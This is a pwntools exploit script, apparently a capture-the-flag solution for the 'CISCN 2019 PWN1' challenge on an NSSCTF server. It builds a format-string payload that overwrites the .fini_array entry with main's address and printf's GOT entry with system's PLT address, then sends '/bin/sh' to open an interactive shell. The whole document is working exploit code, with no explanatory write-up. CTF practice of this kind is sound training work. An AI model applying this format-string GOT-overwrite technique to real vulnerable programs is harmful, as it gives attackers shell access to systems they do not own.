from pwn import *

#io = process("./[CISCN 2019西南]PWN1")
io = remote("node5.anna.nssctf.cn", 20772)
elf = ELF("./[CISCN 2019西南]PWN1")

fini_array = 0x0804979C
printf_got = elf.got["printf"]
system_plt = elf.plt["system"]
main = elf.sym["main"]

"""
system plt address :  0x80483d0
printf got address :  0x804989c
main address :        0x8048534
"""

print("system plt address : ", hex(system_plt))
print("printf got address : ", hex(printf_got))
print("main address : ", hex(main))

# offset 4
# payload = b"aaaa" + b"-%p" * 10

payload = p32(fini_array + 2) + p32(fini_array) + p32(printf_got + 2) + p32(printf_got)
payload += (f"%{0x804 - 0x10}c%4$hn" + f"%{0x8534 - 0x804}c%5$hn").encode()
payload += (f"%{0x10000-0x8534+0x804}c%6$hn"+f"%{0x83d0-0x804}c%7$hn").encode()

io.recvuntil(b"name?")
io.sendline(payload)
io.recvuntil(b"name?")
io.sendline(b"/bin/sh")

io.interactive()
